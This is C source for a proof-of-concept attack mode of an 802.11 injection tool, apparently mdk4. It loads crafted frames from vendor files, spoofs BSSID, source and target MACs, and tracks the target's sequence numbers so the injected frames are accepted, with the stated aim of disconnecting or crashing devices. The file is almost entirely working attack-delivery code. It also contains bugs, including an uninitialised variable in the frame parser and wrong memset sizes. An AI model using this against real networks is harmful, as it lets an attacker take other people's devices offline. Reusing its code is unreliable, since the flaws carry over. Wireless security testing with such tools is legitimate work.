#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <dirent.h>
#include <pthread.h>
#include <ctype.h>

#include "poc.h"

#include "../osdep.h"
#include "../channelhopper.h"
#include "../helpers.h"
#include <ctype.h>


#define POC_NAME "Proof-of-concept of WiFi protocol implementation vulnerability testing"

struct poc_packet *poc_pkts = NULL;
int vendor_cnt = 0;

int get_file_lines(char * filename);
int str_to_hex(unsigned char *pascii, unsigned char *phex, unsigned int len);

void poc_shorthelp()
{
  printf("  Proof-of-concept of WiFi protocol implementation vulnerability,\n");
  printf("  to test whether the device has wifi vulnerabilities.\n");
  printf("  It may cause the wifi connection to be disconnected or the target device to crash.\n");
}

void poc_longhelp()
{
  printf( "  Proof-of-concept of 802.11 protocol implementation vulnerability,\n"
	  "  to test whether the device has wifi vulnerabilities.\n"
      "  It may cause the wifi connection to be disconnected or the target device to crash.\n"
	  "      -s <pps>\n"
	  "         Set speed in packets per second (Default: unlimited)\n"
	  "      -c [chan,chan,...,chan[:speed]]\n"
	  "         Enable channel hopping. When -c h is given, mdk4 will hop an all\n"
	  "         14 b/g channels. Channel will be changed every 3 seconds,\n"
	  "         if speed is not specified. Speed value is in milliseconds!\n"
      "      -v <vendor>\n"
      "         File name in pocs dir, default test all.\n"
	  "      -B <BSSID，AP MAC>\n"
	  "         set an AP MAC\n"
	  "      -S <Source MAC>\n"
	  "         set source MAC.\n"
      "      -T <Target MAC>\n"
	  "         set target MAC.\n"
      );
}

void* poc_parse(int argc, char *argv[]) {
  int opt, speed;
  char *speedstr;
  DIR *dir;
  struct dirent *ptr;
  int file_cnt;
  int file_lines;
  char poc_path[256];
  char file_name[255];
  unsigned char buf[8192];
  FILE *fp1;
  int i, j;
    
  struct poc_options *popt = malloc(sizeof(struct poc_options));
  memset(popt, 0, sizeof(struct poc_options));

  while ((opt = getopt(argc, argv, "s:v:c:B:S:T:")) != -1) {
    switch (opt) {
    case 's':
        popt->speed = (unsigned int) atoi(optarg);
        break;
    case 'c':
        speed = 3000000;
        speedstr = strrchr(optarg, ':');
        if (speedstr != NULL) {
            speed = 1000 * atoi(speedstr + 1);
        }
        if (optarg[0] == 'h') {
            init_channel_hopper(NULL, speed);
        } else {
            init_channel_hopper(optarg, speed);
        }
        break;
    case 'v':
        strncpy(popt->vendor, optarg, sizeof(popt->vendor) - 1);
        break;
	case 'B':
        popt->bssid = parse_mac(optarg);
	    break;
	case 'S':
  	    popt->source_mac = parse_mac(optarg);
	    break;
    case 'T':
        popt->target_mac = parse_mac(optarg);
        break;
    default:
        poc_longhelp();
        printf("\n\nUnknown option %c\n", opt);
        return NULL;
    }
  }
    // load PoC packets
    strcpy(poc_path, "./pocs");
    dir=opendir(poc_path);
    if (dir == NULL){
        strcpy(poc_path, "/usr/share/mdk4/pocs");
        dir=opendir(poc_path);
        if(dir == NULL){
            strcpy(poc_path, "/usr/local/share/mdk4/pocs");
            dir=opendir(poc_path);
            if(dir == NULL){
                printf("Open pocs dir error!\n");
                exit(1);
            }
	}
    }

    file_cnt = 0;
    while((ptr=readdir(dir)) != NULL)
    {
        if(strcmp(ptr->d_name, ".") == 0 || strcmp(ptr->d_name, "..") == 0)
            continue;
        
        if(ptr->d_type == 8) // file
        {
            file_cnt++;
        }
    }
    closedir(dir);

    if(file_cnt)
    {
        vendor_cnt = file_cnt;
        poc_pkts = (struct poc_packet*)malloc(sizeof(struct poc_packet) * file_cnt);
        if(poc_pkts == NULL)
        {
            printf("malloc error!\n");
            exit(-1);
        }

        memset(poc_pkts, 0, sizeof(struct poc_packet) * file_cnt);

        i=0;
        dir=opendir(poc_path);
        while((ptr=readdir(dir)) != NULL)
        {
            if(strcmp(ptr->d_name, ".") == 0 || strcmp(ptr->d_name, "..") == 0)
                continue;
            
            if(ptr->d_type == 8) // file
            {
                memset(file_name, 0, sizeof(file_name));
                strcpy(file_name, poc_path);
                strcat(file_name, "/");
                strcat(file_name, ptr->d_name);
                strncpy(poc_pkts[i].vendor, ptr->d_name, sizeof(poc_pkts[i].vendor));
        
                file_lines = get_file_lines(file_name);
                if(file_lines)
                {
                    poc_pkts[i].pkt_cnt = file_lines;
                    poc_pkts[i].pkts = (struct packet*)malloc(sizeof(struct packet) * file_lines);
                    memset(poc_pkts[i].pkts, 0, sizeof(sizeof(struct packet) * file_lines));
                    j=0;
                    if((fp1 = fopen(file_name, "r")) != NULL)
                    {
                        while(!feof(fp1))
                        {
                            memset(buf, 0, sizeof(buf));
                            if(fgets(buf, sizeof(buf), fp1))
                            {
                                if(buf[0] == '#' || buf[0] == '\r' || buf[0] == '\n')
                                    continue;

                                poc_pkts[i].pkts[j].len = str_to_hex(buf, poc_pkts[i].pkts[j].data, sizeof(poc_pkts[i].pkts[j].data));
                                j++;
                            }

                        }

                        fclose(fp1);
                    }
                    i++;
                }
            }
        }

        vendor_cnt = i;
        closedir(dir);
    }

    if(vendor_cnt == 0)
    {
        printf("Poc packet is empty!\n");
        exit(-1);
    }

  return (void *)popt;
}


unsigned char get_target(struct poc_options *popt) {
    struct packet sniffed;
    struct ieee_hdr *hdr;
    uint8_t dsflags;
    unsigned char ret = 0;
    struct ether_addr dmac, smac, bssid;
    uint16_t seq_ctrl;
    uint16_t recv_seq_ctrl;

    if(popt == NULL)
        return ret;

    while(1) {
        sniffed = osdep_read_packet();
        if (sniffed.len == 0) {
            sleep(1);
            continue;
        }

        hdr = (struct ieee_hdr *) sniffed.data;
        if((hdr->type & 0x0F) != MANAGMENT_FRAME && (hdr->type & 0x0F) != DATA_FRAME){
            //continue;
            popt->seq_ctrl++;
            popt->data_seq_ctrl++;
            ret = 1;
            break;
        }
            

        //if(hdr->type == IEEE80211_TYPE_BEACON || hdr->type == IEEE80211_TYPE_PROBEREQ || hdr->type == IEEE80211_TYPE_PROBERES)
        //    continue;

        switch (dsflags) {
            case 0x00: //Ad Hoc, Beacons:    ToDS 0 FromDS 0  Addr: DST, SRC, BSS
            MAC_COPY(dmac, hdr->addr1);
            MAC_COPY(smac, hdr->addr2);
            MAC_COPY(bssid, hdr->addr3);
            break;
            case 0x01: 	//From station to AP: ToDS 1 FromDS 1  Addr: BSS, SRC, DST
            MAC_COPY(bssid, hdr->addr1);
            MAC_COPY(smac, hdr->addr2);
            MAC_COPY(dmac, hdr->addr3);
            break;
            case 0x02: //From AP to station: ToDS 0 FromDS 1  Addr: DST, BSS, SRC
            MAC_COPY(dmac, hdr->addr1);
            MAC_COPY(bssid, hdr->addr2);
            MAC_COPY(smac, hdr->addr3);
            break;
            case 0x03: //WDS: ToDS 1 FromDS 1  Addr: RCV, TRN, DST ... SRC
            MAC_COPY(bssid, hdr->addr1);
            MAC_COPY(dmac, hdr->addr3);
            MAC_COPY(smac, *(struct ether_addr*)(sniffed.data + sizeof(struct ieee_hdr)));
            break;
        }

        if(MAC_MATCHES(smac, popt->source_mac))
        {
            seq_ctrl = get_seqno(&sniffed);
            if((hdr->type & 0x0F) == MANAGMENT_FRAME)
            {
                if(seq_ctrl != popt->seq_ctrl)
                {
                    popt->seq_ctrl = seq_ctrl;
                    set_seqno(NULL, seq_ctrl);
                    ret = 1;
                    break;
                }


            }
            else if((hdr->type & 0x0F) == DATA_FRAME)
            {
                if(seq_ctrl != popt->data_seq_ctrl)
                {
                    popt->data_seq_ctrl = seq_ctrl;
                    ret = 1;
                    break;
                }
            }

        }
    }
    return ret;
}

void dumphex(uint8_t *data, uint32_t length)
{
  uint32_t i;

  for(i = 0; i< length; i++)
  {
    printf("\\x%02X", data[i]);
    
    /*if((i+1) % 16 == 0) 
    {
      printf("\n");
    }*/
  }  

  printf("\n");
}

struct packet poc_getpacket(void *options) {
    struct poc_options *popt = (struct poc_options *) options;
    struct packet pkt = {0};
    struct ieee_hdr *hdr;
    uint16_t next_seqno = 0;
	uint8_t dsflags;
    static int vendor_idx=-1, pkt_idx=0;
    int i;

    if (popt->speed) sleep_till_next_packet(popt->speed);

    if(vendor_cnt > 0)
    {
        if(strlen(popt->vendor) != 0)
        {
            for(i = 0; i< vendor_cnt; i++)
            {
                if(strcmp(poc_pkts[i].vendor, popt->vendor) == 0)
                {
                    vendor_idx = i;
                    break;
                }
            }
        }
        else{
            vendor_idx = 0;
        }

        if(vendor_idx >=0)
        {
            if(poc_pkts[vendor_idx].pkt_cnt == pkt_idx)
            {
                if(strlen(popt->vendor) == 0)
                {
                    vendor_idx++;
                    if(vendor_idx == vendor_cnt)
                        vendor_idx = 0;
                }

                pkt_idx = 0;
            }

            if(poc_pkts[vendor_idx].pkts[pkt_idx].len != 0)
            {
                memset(pkt.data, 0, sizeof(struct packet));
                pkt = poc_pkts[vendor_idx].pkts[pkt_idx];
                hdr = (struct ieee_hdr *)pkt.data;
                dsflags = hdr->flags & 0x03;

                if((hdr->type & 0x0F) != 0x04)
				{
                    switch (dsflags) {
                        case 0x00: //Ad Hoc, Beacons:    ToDS 0 FromDS 0  Addr: DST, SRC, BSS
                        MAC_COPY(hdr->addr1, popt->target_mac);
                        MAC_COPY(hdr->addr2, popt->source_mac);
                        MAC_COPY(hdr->addr3, popt->bssid);
                        break;
                        case 0x01: //From station to AP: ToDS 1 FromDS 1  Addr: BSS, SRC, DST
                        MAC_COPY(hdr->addr1, popt->bssid);
                        MAC_COPY(hdr->addr2, popt->source_mac);
                        MAC_COPY(hdr->addr3, popt->target_mac);
                        break;
                        case 0x02: //From AP to station: ToDS 0 FromDS 1  Addr: DST, BSS, SRC
                        MAC_COPY(hdr->addr1, popt->target_mac);
                        MAC_COPY(hdr->addr2, popt->bssid);
                        MAC_COPY(hdr->addr3, popt->source_mac);
                        break;
                        case 0x03: //WDS: ToDS 1 FromDS 1  Addr: RCV, TRN, DST ... SRC
                        MAC_COPY(hdr->addr1, popt->bssid);
                        MAC_COPY(hdr->addr2, popt->bssid);
                        MAC_COPY(hdr->addr3, popt->target_mac);
                        MAC_COPY(*(struct ether_addr*)(poc_pkts[vendor_idx].pkts[pkt_idx].data + sizeof(struct ieee_hdr)), popt->source_mac);
                        break;
                    }

                    if(hdr->type == IEEE80211_TYPE_BEACON)
                    {
                        memcpy(hdr->addr1.ether_addr_octet, BROADCAST, ETHER_ADDR_LEN);
                    }

                    while(!get_target(popt));

                    if(hdr->type == IEEE80211_TYPE_BEACON)
                    {
                        memcpy(hdr->addr1.ether_addr_octet, BROADCAST, ETHER_ADDR_LEN);
                    }

                    if((hdr->type & 0x0F) == MANAGMENT_FRAME)
                    {
                        next_seqno = popt->seq_ctrl + 1;
                        set_seqno(&pkt, next_seqno);
                    }
                    else if((hdr->type & 0x0F) == DATA_FRAME)
                    {
                        next_seqno = popt->data_seq_ctrl + 1;
                        set_seqno(&pkt, next_seqno);
                    }

                }
                else
                {
					switch(hdr->type)
					{
						case IEEE80211_TYPE_BEAMFORMING:
							memcpy(hdr->addr1.ether_addr_octet, popt->target_mac.ether_addr_octet, ETHER_ADDR_LEN);
							memcpy(hdr->addr2.ether_addr_octet, popt->source_mac.ether_addr_octet, ETHER_ADDR_LEN);
							break;
						case IEEE80211_TYPE_VHT:
							memcpy(hdr->addr1.ether_addr_octet, popt->target_mac.ether_addr_octet, ETHER_ADDR_LEN);
							memcpy(hdr->addr2.ether_addr_octet, popt->source_mac.ether_addr_octet, ETHER_ADDR_LEN);
							break;
						case IEEE80211_TYPE_CTRLFRMEXT:
							break;
						case IEEE80211_TYPE_CTRLWRAP:
							memcpy(hdr->addr1.ether_addr_octet, popt->target_mac.ether_addr_octet, ETHER_ADDR_LEN);
							break;
						case IEEE80211_TYPE_BLOCKACKREQ:
							memcpy(hdr->addr1.ether_addr_octet, popt->target_mac.ether_addr_octet, ETHER_ADDR_LEN);
							memcpy(hdr->addr2.ether_addr_octet, popt->source_mac.ether_addr_octet, ETHER_ADDR_LEN);
							break;
						case IEEE80211_TYPE_BLOCKACK:
							memcpy(hdr->addr1.ether_addr_octet, popt->target_mac.ether_addr_octet, ETHER_ADDR_LEN);
							memcpy(hdr->addr2.ether_addr_octet, popt->source_mac.ether_addr_octet, ETHER_ADDR_LEN);
							break;
						case IEEE80211_TYPE_PSPOLL:
							memcpy(hdr->addr1.ether_addr_octet, popt->target_mac.ether_addr_octet, ETHER_ADDR_LEN);
							memcpy(hdr->addr2.ether_addr_octet, popt->source_mac.ether_addr_octet, ETHER_ADDR_LEN);
							break;
						case IEEE80211_TYPE_RTS:
							memcpy(hdr->addr1.ether_addr_octet, popt->target_mac.ether_addr_octet, ETHER_ADDR_LEN);
							memcpy(hdr->addr2.ether_addr_octet, popt->source_mac.ether_addr_octet, ETHER_ADDR_LEN);
							break;
						case IEEE80211_TYPE_CTS:
							memcpy(hdr->addr1.ether_addr_octet, popt->target_mac.ether_addr_octet, ETHER_ADDR_LEN);
							break;
						case IEEE80211_TYPE_ACK:
							memcpy(hdr->addr1.ether_addr_octet, popt->source_mac.ether_addr_octet, ETHER_ADDR_LEN);
							break;
						case IEEE80211_TYPE_CFEND:
							memcpy(hdr->addr1.ether_addr_octet, popt->target_mac.ether_addr_octet, ETHER_ADDR_LEN);
							memcpy(hdr->addr2.ether_addr_octet, popt->source_mac.ether_addr_octet, ETHER_ADDR_LEN);
							break;
						case IEEE80211_TYPE_CFENDACK:
							memcpy(hdr->addr1.ether_addr_octet, popt->target_mac.ether_addr_octet, ETHER_ADDR_LEN);
							memcpy(hdr->addr2.ether_addr_octet, popt->source_mac.ether_addr_octet, ETHER_ADDR_LEN);
							break;
						default:
							break;
					}
                }

                pkt_idx++;

                //dumphex(pkt.data, pkt.len);
            }
        }
        else{
            printf("There is no %s PoC file!\n", popt->vendor);
            exit(-1);
        }
    }
    
    return pkt;
}

void poc_print_stats(void *options) {
  int chan = osdep_get_channel();
  options = options; //Avoid unused warning

  if (chan) {
    printf(" on channel %d\n", chan);
  } else {
    printf("\n");
  }
}

void poc_perform_check(void *options) {
  //Nothing to check for beacon flooding attacks
  options = options; //Avoid unused warning
}

int get_file_lines(char * filename)
{
    unsigned char buf[8192];
    FILE *fp;
    int lines = 0;

    if(fp = fopen(filename, "r"))
    {
        while(!feof(fp))
        {
            memset(buf, 0, sizeof(buf));
            if(fgets(buf, sizeof(buf), fp))
            {
                if(buf[0] == '#' || buf[0] == '\r' || buf[0] == '\n')
                    continue;

                lines++;
            }

        }
    }

    return lines;
}

int str_to_hex(unsigned char *pascii, unsigned char *phex, unsigned int len)
{
	int i = 0;
	int str_len;
	char h1, h2;
	unsigned char s1, s2;

	if(pascii == NULL || phex == NULL || len == 0)
		return (int)NULL;

	str_len = strlen(pascii)/4;
	if(str_len)
	{
		for(i=0; i<str_len; i++)
		{
			h1 = pascii[4*i + 2];
			h2 = pascii[4*i + 3];

			s1 = toupper(h1) - 0x30;
			if(s1 > 9)
				s1 -= 7;

			s2 = toupper(h2) - 0x30;
			if(s2 > 9)
				s2 -= 7;
			
			if(i < len)
				phex[i] = s1 * 16 + s2;
		}
	}

	return i;
}

struct attacks load_poc()
{
    struct attacks this_attack;
    char *poc_name = malloc(strlen(POC_NAME) + 1);
    strcpy(poc_name, POC_NAME);

    this_attack.print_shorthelp = (fp) poc_shorthelp;
    this_attack.print_longhelp = (fp) poc_longhelp;
    this_attack.parse_options = (fpo) poc_parse;
    this_attack.get_packet = (fpp) poc_getpacket;
    this_attack.print_stats = (fps) poc_print_stats;
    this_attack.perform_check = (fps) poc_perform_check;
    this_attack.mode_identifier = POC_MODE;
    this_attack.attack_name = poc_name;

    return this_attack;   
}
